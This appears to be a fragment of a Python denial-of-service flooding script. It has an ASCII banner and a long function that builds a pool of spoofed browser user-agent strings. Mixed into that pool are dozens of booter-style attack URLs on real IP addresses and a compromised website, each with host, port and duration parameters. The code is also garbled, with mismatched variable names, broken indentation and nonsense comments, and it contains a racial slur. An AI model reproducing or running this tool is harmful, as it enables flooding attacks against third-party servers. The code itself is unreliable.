	print "..#######..#####....####...##....##..######...#######...####...##.....##..######..##...##....##."
	print ".##........##..##..##..##..###...##..##...##..##.......##..##..###...###....##....##....##..##.."
	print ".##...###..#####...######..##.##.##..##...##..######...######..##.###.##....##....##......##...."
	print ".##.....#..##..##..##..##..##...###..##...##..##.......##..##..##..#..##....##....##......##...."
	print "..#####.#..##..##..##..##..##....##..######...##.......##..##..##.....##..######..######..##...."
	print "................................................................................................"
	print" Please wait while the packages are getting ready.... \n"
	os.system('sleep 5')
	os.system('clear')

#9[]_{{}}_[]3_//-\\_[]__ []D//-\\[]2//-\\|\/|373[]125
#Guess The Codes Nigga
	url=''
	host=''
	header_useragents=[]
	header_referers=[]
	request_counter=0
	flag=0
	love=0

	def inc_counter():
		global request_counter
		request_counter+=125

	def set_flag(val):
		global flag
		flag=val

	def set_love():
		global love
		love=1

# ()
# jinirheyths ugh hyushir eyjenth ughrehy
	def useragent_list():
		global headers_useragents
		headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
		headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
		headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
		headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
		headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
		headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
		headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322')
		headers_useragents.append('Googlebot/2.1 http://www.googlebot.com/bot.html')
		headers_useragents.append('Opera/9.20 Windows NT 6.0; U; en')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux i686; en-US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 Debian-2.0.0.1+dfsg-2')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322')
		headers_useragents.append('Opera/10.00 X11; Linux i686; U; en Presto/2.2.0')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 6.0; he-IL AppleWebKit/528.16 KHTML, like Gecko Version/4.0 Safari/528.16')
		headers_useragents.append('Mozilla/5.0 compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0')
		headers_useragents.append('Mozilla/5.0 compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0b; Windows NT 6.0')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 6.0b; Windows 98')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 6.1; ru; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.2.7 Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
		headers_useragents.append('Mozilla/5.0 compatible; Googlebot/2.1; +http://www.google.com/bot.html')
		headers_useragents.append('Mozilla/5.0 compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp')
		headers_useragents.append('YahooSeeker/1.2 compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 6.1; en; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 5.1; en-US AppleWebKit/532.1 KHTML, like Gecko Chrome/4.0.219.6 Safari/532.1')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2')
		headers_useragents.append('Mozilla/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; en-US')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 6.1; Windows XP')
		headers_useragents.append('Opera/9.80 Windows NT 5.2; U; ru Presto/2.5.22 Version/10.51')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322')
		headers_useragents.append('Googlebot/2.1 http://www.googlebot.com/bot.html')
		headers_useragents.append('Opera/9.20 Windows NT 6.0; U; en')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux i686; en-US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 Debian-2.0.0.1+dfsg-2',)
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322')
		headers_useragents.append('Opera/10.00 X11; Linux i686; U; en Presto/2.2.0')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 6.0; he-IL AppleWebKit/528.16 KHTML, like Gecko Version/4.0 Safari/528.16')
		headers_useragents.append('Mozilla/5.0 compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0')
		headers_useragents.append('Mozilla/5.0 compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0b; Windows NT 6.0')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 6.0b; Windows 98')
		headers_useragents.append('Mozilla/5.0 Windows; U; Windows NT 6.1; ru; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8')
		headers_useragents.append('Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.2.7 Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
		headers_useragents.append('Mozilla/5.0 compatible; Googlebot/2.1; +http://www.google.com/bot.html')
		headers_useragents.append('Mozilla/5.0 compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp')
		headers_useragents.append('YahooSeeker/1.2 compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30')
		headers_useragents.append('Mozilla/4.0 compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322')
		headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
		headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
		headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
		headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
		headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
		headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b2pre) Gecko/2007112704 Minefield/3.0b2pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3) Gecko/2008020513 Firefox/3.0b3')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3) Gecko/2008021322 Minefield/3.0b3')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3pre) Gecko/2008010404 Minefield/3.0b3pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3pre) Gecko/2008010415 Firefox/3.0b')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3pre) Gecko/2008020507 Firefox/3.0b3pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4) Gecko/2008031317 Firefox/3.0b4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008021712 Firefox/3.0b4pre (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008021714 Firefox/3.0b4pre (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008022304 Minefield/3.0b4pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5) Gecko/2008042623 Iceweasel/3.0b5 (Debian-3.0~b5-3)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008032621 Fedora/3.0-0.49.cvs20080326.fc9 Minefield/3.0pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008040318 Firefox/3.0pre (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008051917 Firefox/3.0pre Flock/2.0a1pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008061501 SeaMonkey/2.0a1pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008061504 Minefield/3.0pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:2.0a1pre) Gecko/2008060602 Minefield/4.0a1pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-ZW; rv:1.8.0.7) Gecko/20061018 Firefox/1.5.0.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-gb) AppleWebKit/525.1+ (KHTML, like Gecko, Safari/525.1+) epiphany-webkit')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-us; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.04 (jaunty) Firefox/3.5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.0.7) Gecko/20060928 Epiphany/2.14 (Ubuntu)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.1) Gecko/20070117 Epiphany/2.16 BonEcho/2.0.0.1')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.10) Gecko/20071213 Epiphany/2.20 Firefox/2.0.0.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.11) Gecko/20071216 Firefox/2.0.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-2) Epiphany/2.20')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-5) Epiphany/2.20')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.14) Gecko/20080416 Fedora/2.18.3-9.fc7 Epiphany/2.18 Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.14) Gecko/20080418 Epiphany/2.20 Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.17) Gecko/20080927 Epiphany/2.20 Firefox/2.0.0.17 (Dropline GNOME)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.19) Gecko/20081216 Epiphany/2.20 Firefox/2.0.0.19')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.2) Gecko/20070220 Firefox/2.0.0.2')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20061201 Epiphany/2.18 Firefox/2.0.0.3 (Ubuntu-feisty)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20070322 Epiphany/2.18')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20070403 Epiphany/2.16 Firefox/2.0.0.3')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.4) Gecko/20070508 (Debian-1.8.1.4-1) Epiphany/2.18')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.5) Gecko/20070712 (Debian-1.8.1.5-1) Epiphany/2.18')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/20080528 (Gentoo) Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/2008062113 Iceweasel/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.12) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.14) Gecko/20080528 Epiphany/2.22 (Debian/2.26.3-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.15) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.4) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.5) Gecko/20080528 Fedora/2.24.1-3.fc10 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.6) Gecko/20080528')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.6) Gecko/2009020911 Ubuntu/8.10 (intrepid) Firefox/3.0.6')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.7) Gecko/20080528 Epiphany/2.22')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 (Debian/2.24.3-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.9) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9a4) Gecko/20070427 GranParadiso/3.0a4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9b3) Gecko Epiphany/2.20')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en_GB; rv:1.9.0.1) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en_US; rv:1.8.1b1) Gecko/20060813 Firefox/2.0b1')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.2.1) Gecko/20021130')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.11) Gecko/20071204 Ubuntu/7.10 (gutsy) Firefox/2.0.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)')
